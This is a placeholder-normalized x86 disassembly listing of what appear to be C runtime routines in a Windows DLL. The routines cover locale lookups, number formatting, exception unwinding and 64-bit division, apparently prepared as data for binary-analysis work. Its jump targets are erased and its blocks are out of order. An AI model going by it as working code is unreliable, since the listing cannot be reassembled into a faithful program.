lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001cffa
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001cffa
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1001cffa
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_10082c43
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_1007fa40
inc eax
push eax
push esi
add esi edi
push esi
call sub_1007ec40
add esp 0x10
sub_10082c62
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_10051cf5
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_1005b670
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_1005b670
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_10082c43
pop esi
mov [ eax ] esi
call sub_1004b131
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1007ec40
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_10082dc3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_10051cf5
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_1007fa40
inc eax
push eax
push esi
push ebx
call sub_1007ec40
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_1007fa40
inc eax
push eax
push esi
push ebx
call sub_1007ec40
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_10082c43
push edi
push 0x30
push ebx
call sub_1007f8f0
add esp 0xc
sub_10082ec6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1002255a
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_10021090
pop ecx
cmp eax esi
je r-xdata
call sub_10082fa0
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_10082fcc
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_10029cd9
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_1008302e
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_1003f2b0
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_100830b2
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_100830d7
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_10083108
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_10083123
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002d269
mov edx edi
mov esi eax
call sub_100830d7
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_10029cd9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_100830b2
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_100831ca
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_10083108
push esi
mov edi eax
call sub_1007fa40
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_10083225
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002d269
mov edx edi
lea esi [ eax + 0x9c ]
call sub_100830d7
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10029cd9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10029cd9
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10029cd9
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10011b4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10029cd9
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_1007fa40
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_100830b2
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_1007fa40
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_100831ca
pop ecx
pop ecx
test eax eax
je r-xdata
sub_100833f6
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002d269
mov edx edi
lea esi [ eax + 0x9c ]
call sub_100830d7
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10029cd9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10029cd9
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_100831ca
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_100834b6
push [ esi ]
call sub_1007fa40
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_1007fa40
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_10083108
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_10083225
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_1008351d
push [ esi ]
call sub_1007fa40
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_10083108
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_100833f6
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_10083560
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_100835a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10083600
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10083620
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10032529
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10083665
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10083665
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10083620
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10083715
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10083734
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1008370c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10083715
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10083737
push 0x14
push r--data
call sub_1007fad0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10083808
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1007fb15
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1004684b
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_100837d9
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10039bd6
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10039bd6
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10083820
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_10083850
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
